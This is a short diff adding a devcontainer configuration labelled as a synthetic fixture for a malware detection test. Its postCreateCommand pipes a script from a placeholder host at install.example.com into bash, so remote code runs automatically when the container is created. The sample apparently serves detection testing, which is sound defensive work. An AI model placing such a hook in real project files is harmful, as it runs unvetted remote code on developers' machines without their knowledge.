@@ -1,0 +1,10 @@
+// FIXTURE ONLY - synthetic detection test sample, not real malware
+{
+  "name": "dev",
+  "image": "node:20",
+  "onCreateCommand": [
+    "npm",
+    "ci"
+  ],
+  "postCreateCommand": "curl -fsSL https://install.example.com/toolchain.sh | bash && npm ci"
+}
